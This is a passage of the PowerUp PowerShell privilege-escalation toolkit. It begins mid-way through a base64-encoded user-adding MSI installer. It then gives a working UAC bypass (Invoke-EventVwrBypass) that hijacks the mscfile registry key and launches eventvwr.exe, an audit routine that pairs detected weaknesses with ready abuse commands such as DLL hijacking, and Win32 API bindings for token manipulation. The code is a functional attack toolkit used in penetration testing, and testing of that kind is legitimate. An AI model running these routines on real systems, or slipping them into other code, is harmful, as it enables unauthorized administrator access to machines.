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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACBzZXQuICBUaGUgZGVmYXVsdCBpcyAiQUxMIi5BY3Rpb25Qcm9wZXJ0eVRoZSBwcm9wZXJ0eSB0byBzZXQgd2hlbiBhIHByb2R1Y3QgaW4gdGhpcyBzZXQgaXMgZm91bmQuQ29zdEluaXRpYWxpemVGaWxlQ29zdENvc3RGaW5hbGl6ZUluc3RhbGxWYWxpZGF0ZUluc3RhbGxJbml0aWFsaXplSW5zdGFsbEFkbWluUGFja2FnZUluc3RhbGxGaWxlc0luc3RhbGxGaW5hbGl6ZUV4ZWN1dGVBY3Rpb25QdWJsaXNoRmVhdHVyZXNQdWJsaXNoUHJvZHVjdGJ6LldyYXBwZWRTZXR1cFByb2dyYW1iei5DdXN0b21BY3Rpb25EbGxiei5Qcm9kdWN0Q29tcG9uZW50e0VERTEwRjZDLTMwRjQtNDJDQS1CNUM3LUFEQjkwNUU0NUJGQ31CWi5JTlNUQUxMRk9MREVScmVnOUNBRTU3QUY3QjlGQjRFRjI3MDZGOTVCNEI4M0I0MTlTZXRQcm9wZXJ0eUZvckRlZmVycmVkYnouTW9kaWZ5UmVnaXN0cnlbQlouV1JBUFBFRF9BUFBJRF1iei5TdWJzdFdyYXBwZWRBcmd1bWVudHNfU3Vic3RXcmFwcGVkQXJndW1lbnRzQDRiei5SdW5XcmFwcGVkU2V0dXBbYnouU2V0dXBTaXplXSAiW1NvdXJjZURpcl1cLiIgW0JaLklOU1RBTExfU1VDQ0VTU19DT0RFU10gKltCWi5GSVhFRF9JTlNUQUxMX0FSR1VNRU5UU11bV1JBUFBFRF9BUkdVTUVOVFNdX01vZGlmeVJlZ2lzdHJ5QDRiei5Vbmluc3RhbGxXcmFwcGVkX1VuaW5zdGFsbFdyYXBwZWRANFByb2dyYW1GaWxlc0ZvbGRlcmJ4anZpbHc3fFtCWi5DT01QQU5ZTkFNRV1UQVJHRVRESVIuU291cmNlRGlyUHJvZHVjdEZlYXR1cmVNYWluIEZlYXR1cmVQcm9kdWN0SWNvbkZpbmRSZWxhdGVkUHJvZHVjdHNMYXVuY2hDb25kaXRpb25zVmFsaWRhdGVQcm9kdWN0SURNaWdyYXRlRmVhdHVyZVN0YXRlc1Byb2Nlc3NDb21wb25lbnRzVW5wdWJsaXNoRmVhdHVyZXNSZW1vdmVSZWdpc3RyeVZhbHVlc1dyaXRlUmVnaXN0cnlWYWx1ZXNSZWdpc3RlclVzZXJSZWdpc3RlclByb2R1Y3RSZW1vdmVFeGlzdGluZ1Byb2R1Y3RzTk9UIFJFTU9WRSB+PSJBTEwiIEFORCBOT1QgVVBHUkFERVBST0RVQ1RDT0RFUkVNT1ZFIH49ICJBTEwiIEFORCBOT1QgVVBHUkFESU5HUFJPRFVDVENPREVOT1QgV0lYX0RPV05HUkFERV9ERVRFQ1RFRERvd25ncmFkZXMgYXJlIG5vdCBhbGxvd2VkLkFMTFVTRVJTMUFSUE5PUkVQQUlSQVJQTk9NT0RJRllBUlBQUk9EVUNUSUNPTkFSUEhFTFBMSU5LaHR0cDovL3d3dy5leGVtc2kuY29tQVJQVVJMSU5GT0FCT1VUQVJQQ09NTUVOVFNNU0kgVGVtcGxhdGUuQVJQQ09OVEFDVE15IGNvbnRhY3QgaW5mb3JtYXRpb24uQVJQVVJMVVBEQVRFSU5GT015IHVwZGF0ZSBpbmZvcm1hdGlvbi5CWi5WRVJGQlouV1JBUFBFRF9BUFBJRHs1NjYyODkxMi04RUQ0LTQ4RUYtQUM1Mi1FRTgzQTFCRkJGMTF9X2lzMUJaLkNPTVBBTllOQU1FRVhFTVNJLkNPTUJaLklOU1RBTExfU1VDQ0VTU19DT0RFUzBCWi5GSVhFRF9JTlNUQUxMX0FSR1VNRU5UUy9TSUxFTlQgQlouVUlOT05FX0lOU1RBTExfQVJHVU1FTlRTIEJaLlVJQkFTSUNfSU5TVEFMTF9BUkdVTUVOVFNCWi5VSVJFRFVDRURfSU5TVEFMTF9BUkdVTUVOVFNCWi5VSUZVTExfSU5TVEFMTF9BUkdVTUVOVFNCWi5GSVhFRF9VTklOU1RBTExfQVJHVU1FTlRTQlouVUlOT05FX1VOSU5TVEFMTF9BUkdVTUVOVFNCWi5VSUJBU0lDX1VOSU5TVEFMTF9BUkdVTUVOVFNCWi5VSVJFRFVDRURfVU5JTlNUQUxMX0FSR1VNRU5UU0JaLlVJRlVMTF9VTklOU1RBTExfQVJHVU1FTlRTYnouU2V0dXBTaXplMjMyOTYwTWFudWZhY3R1cmVyUHJvZHVjdENvZGV7MjcxQkJDRUQtRjM2QS00RThFLUE1NzYtOTQ1NUYwQ0EwMUE4fVByb2R1Y3RMYW5ndWFnZTEwMzNQcm9kdWN0TmFtZU1TSSBXcmFwcGVyIFRlbXBsYXRlUHJvZHVjdFZlcnNpb24xLjAuMC4we0NDMDM1QzE4LTBGQzctNDcwOC04ODA2LUQ0QjA5MUU1OUFBN31TZWN1cmVDdXN0b21Qcm9wZXJ0aWVzV0lYX0RPV05HUkFERV9ERVRFQ1RFRDtXSVhfVVBHUkFERV9ERVRFQ1RFRFNPRlRXQVJFXFtCWi5DT01QQU5ZTkFNRV1cTVNJIFdyYXBwZXJcSW5zdGFsbGVkXFtCWi5XUkFQUEVEX0FQUElEXUxvZ29uVXNlcltMb2dv'

    try {
        [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
        Write-Verbose "MSI written out to '$Path'"

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'OutputPath' $Path
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UserAddMSI')
        $Out
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
    }
}


function Invoke-EventVwrBypass {
<#
.SYNOPSIS

Bypasses UAC by performing an image hijack on the .msc file extension
Only tested on Windows 7 and Windows 10

Author: Matt Nelson (@enigma0x3)  
License: BSD 3-Clause  
Required Dependencies: None

.PARAMETER Command

 Specifies the command you want to run in a high-integrity context. For example, you can pass it powershell.exe followed by any encoded command "powershell -enc <encodedCommand>"

.EXAMPLE

Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="

This will write out "Is Elevated: True" to C:\UACBypassTest.
#>

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        #Begin Execution
        $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
        $Command = $pshome + '\' + $Command
        #Add in the new registry entries to hijack the msc file
        if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $mscCommandPath -Force |
                New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
        }else{
            Write-Warning "Key already exists, consider using -Force"
            exit
        }

        if (Test-Path $mscCommandPath) {
            Write-Verbose "Created registry entries to hijack the msc extension"
        }else{
            Write-Warning "Failed to create registry key, exiting"
            exit
        }

        $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'
        #Start Event Viewer
        if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
            $Process = Start-Process -FilePath $EventvwrPath -PassThru
            Write-Verbose "Started eventvwr.exe"
        }

        #Sleep 5 seconds 
        Write-Verbose "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $mscfilePath = "HKCU:\Software\Classes\mscfile"

        if (Test-Path $mscfilePath) {
            #Remove the registry entry
            Remove-Item $mscfilePath -Recurse -Force
            Write-Verbose "Removed registry entries"
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose "Killed running eventvwr process"
        }
    }
}


function Invoke-PrivescAudit {
<#
.SYNOPSIS

Executes all functions that check for various Windows privilege escalation opportunities.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Executes all functions that check for various Windows privilege escalation opportunities.

.PARAMETER Format

String. Format to decide on what is returned from the command, an Object Array, List, or HTML Report.

.PARAMETER HTMLReport

DEPRECATED - Switch. Write a HTML version of the report to SYSTEM.username.html. 
Superseded by the Format parameter.

.EXAMPLE

Invoke-PrivescAudit

Runs all escalation checks and outputs a status report for discovered issues.

.EXAMPLE

Invoke-PrivescAudit -Format HTML

Runs all escalation checks and outputs a status report to SYSTEM.username.html
detailing any discovered issues.

#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [ValidateSet('Object','List','HTML')]
        [String]
        $Format = 'Object',
        [Switch]
        $HTMLReport
    )

    if($HTMLReport){ $Format = 'HTML' }

    if ($Format -eq 'HTML') {
        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"
        $Header = "<style>"
        $Header = $Header + "BODY{background-color:peachpuff;}"
        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $Header = $Header + "</style>"
        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }

    Write-Verbose "Running Invoke-PrivescAudit"

    $Checks = @(
        # Initial admin checks
        @{
            Type    = 'User Has Local Admin Privileges'
            Command = { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){ New-Object PSObject } }
        },
        @{
            Type        = 'User In Local Group with Admin Privileges'
            Command     = { if ((Get-ProcessTokenGroup | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Command "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { Get-ProcessTokenPrivilege -Special | Where-Object {$_} }
        },
        # Service checks
        @{
            Type    = 'Unquoted Service Paths'
            Command = { Get-UnquotedService }
        },
        @{
            Type    = 'Modifiable Service Files'
            Command = { Get-ModifiableServiceFile }
        },
        @{
            Type    = 'Modifiable Services'
            Command = { Get-ModifiableService }
        },
        # DLL hijacking
        @{
            Type        = '%PATH% .dll Hijacks'
            Command     = { Find-PathDLLHijack }
            AbuseScript = { "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        # Registry checks
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (Get-RegistryAlwaysInstallElevated){ New-Object PSObject } }
            AbuseScript = { 'Write-UserAddMSI' }
        },
        @{
            Type    = 'Registry Autologons'
            Command = { Get-RegistryAutoLogon }
        },
        @{
            Type    = 'Modifiable Registry Autorun'
            Command = { Get-ModifiableRegistryAutoRun }
        },
        # Other checks
        @{
            Type    = 'Modifiable Scheduled Task Files'
            Command = { Get-ModifiableScheduledTaskFile }
        },
        @{
            Type    = 'Unattended Install Files'
            Command = { Get-UnattendedInstallFile }
        },
        @{
            Type    = 'Encrypted web.config Strings'
            Command = { Get-WebConfig | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { Get-ApplicationHost | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { Get-SiteListPassword | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { Get-CachedGPPPassword | Where-Object {$_} }
        }
    )

    ForEach($Check in $Checks){
        Write-Verbose "Checking for $($Check.Type)..."
        $Results = . $Check.Command
        $Results | Where-Object {$_} | ForEach-Object {
            $_ | Add-Member Noteproperty 'Check' $Check.Type
            if ($Check.AbuseScript){
                $_ | Add-Member Noteproperty 'AbuseFunction' (. $Check.AbuseScript)
            }
        }
        switch($Format){
            Object { $Results }
            List   { "`n`n[*] Checking for $($Check.Type)..."; $Results | Format-List }
            HTML   { $Results | ConvertTo-HTML -Head $Header -Body "<H2>$($Check.Type)</H2>" | Out-File -Append $HtmlReportFile }
        }
    }

    if ($Format -eq 'HTML') {
        Write-Verbose "[*] Report written to '$HtmlReportFile' `n"
    }
}


# PSReflect signature specifications
$Module = New-InMemoryModule -ModuleName PowerUpModule
# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', '', Scope='Function')]

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @()),
    (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 OpenProcessToken ([Bool]) @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 LookupPrivilegeName ([Int]) @([IntPtr], [IntPtr], [String].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
)

# https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig             =   '0x00000001'
    ChangeConfig            =   '0x00000002'
    QueryStatus             =   '0x00000004'
    EnumerateDependents     =   '0x00000008'
    Start                   =   '0x00000010'
    Stop                    =   '0x00000020'
    PauseContinue           =   '0x00000040'
    Interrogate             =   '0x00000080'
    UserDefinedControl      =   '0x00000100'
    Delete                  =   '0x00010000'
    ReadControl             =   '0x00020000'
    WriteDac                =   '0x00040000'
    WriteOwner              =   '0x00080000'
    Synchronize             =   '0x00100000'
    AccessSystemSecurity    =   '0x01000000'
    GenericAll              =   '0x10000000'
    GenericExecute          =   '0x20000000'
    GenericWrite            =   '0x40000000'
    GenericRead             =   '0x80000000'
    AllAccess               =   '0x000F01FF'
} -Bitfield

$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_MANDATORY              =   '0x00000001'
    SE_GROUP_ENABLED_BY_DEFAULT     =   '0x00000002'
    SE_GROUP_ENABLED                =   '0x00000004'
    SE_GROUP_OWNER                  =   '0x00000008'
    SE_GROUP_USE_FOR_DENY_ONLY      =   '0x00000010'
    SE_GROUP_INTEGRITY              =   '0x00000020'
    SE_GROUP_RESOURCE               =   '0x20000000'
    SE_GROUP_INTEGRITY_ENABLED      =   '0xC0000000'
} -Bitfield

$LuidAttributes = psenum $Module PowerUp.LuidAttributes UInt32 @{
    DISABLED                            =   '0x00000000'
    SE_PRIVILEGE_ENABLED_BY_DEFAULT     =   '0x00000001'
    SE_PRIVILEGE_ENABLED                =   '0x00000002'
    SE_PRIVILEGE_REMOVED                =   '0x00000004'
    SE_PRIVILEGE_USED_FOR_ACCESS        =   '0x80000000'
} -Bitfield

$SecurityEntity = psenum $Module PowerUp.SecurityEntity UInt32 @{
    SeCreateTokenPrivilege              =   1
    SeAssignPrimaryTokenPrivilege       =   2
    SeLockMemoryPrivilege               =   3
    SeIncreaseQuotaPrivilege            =   4
    SeUnsolicitedInputPrivilege         =   5
    SeMachineAccountPrivilege           =   6
    SeTcbPrivilege                      =   7
    SeSecurityPrivilege                 =   8
    SeTakeOwnershipPrivilege            =   9
    SeLoadDriverPrivilege               =   10
    SeSystemProfilePrivilege            =   11
    SeSystemtimePrivilege               =   12
    SeProfileSingleProcessPrivilege     =   13
    SeIncreaseBasePriorityPrivilege     =   14
    SeCreatePagefilePrivilege           =   15
    SeCreatePermanentPrivilege          =   16
    SeBackupPrivilege                   =   17
    SeRestorePrivilege                  =   18
    SeShutdownPrivilege                 =   19
    SeDebugPrivilege                    =   20
    SeAuditPrivilege                    =   21
    SeSystemEnvironmentPrivilege        =   22
    SeChangeNotifyPrivilege             =   23
    SeRemoteShutdownPrivilege           =   24
    SeUndockPrivilege                   =   25
    SeSyncAgentPrivilege                =   26
    SeEnableDelegationPrivilege         =   27
    SeManageVolumePrivilege             =   28
    SeImpersonatePrivilege              =   29
    SeCreateGlobalPrivilege             =   30
    SeTrustedCredManAccessPrivilege     =   31
    SeRelabelPrivilege                  =   32
    SeIncreaseWorkingSetPrivilege       =   33
    SeTimeZonePrivilege                 =   34
    SeCreateSymbolicLinkPrivilege       =   35
}

$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_TYPE_ENUM = psenum $Module PowerUp.TokenTypeEnum UInt32 @{
    Primary         = 1
    Impersonation   = 2
}

$TOKEN_TYPE = struct $Module PowerUp.TokenType @{
    Type  = field 0 $TOKEN_TYPE_ENUM
}

$SECURITY_IMPERSONATION_LEVEL_ENUM = psenum $Module PowerUp.ImpersonationLevelEnum UInt32 @{
    Anonymous         =   0
    Identification    =   1
    Impersonation     =   2
    Delegation        =   3
}

$IMPERSONATION_LEVEL = struct $Module PowerUp.ImpersonationLevel @{
    ImpersonationLevel  = field 0 $SECURITY_IMPERSONATION_LEVEL_ENUM
}

$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$LUID = struct $Module PowerUp.Luid @{
    LowPart         =   field 0 $SecurityEntity
    HighPart        =   field 1 Int32
}

$LUID_AND_ATTRIBUTES = struct $Module PowerUp.LuidAndAttributes @{
    Luid         =   field 0 $LUID
    Attributes   =   field 1 UInt32
}

$TOKEN_PRIVILEGES = struct $Module PowerUp.TokenPrivileges @{
    PrivilegeCount  = field 0 UInt32
    Privileges      = field 1 $LUID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 50)
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$NTDll    = $Types['ntdll']

Set-Alias Get-CurrentUserTokenGroupSid Get-ProcessTokenGroup
Set-Alias Invoke-AllChecks Invoke-PrivescAudit
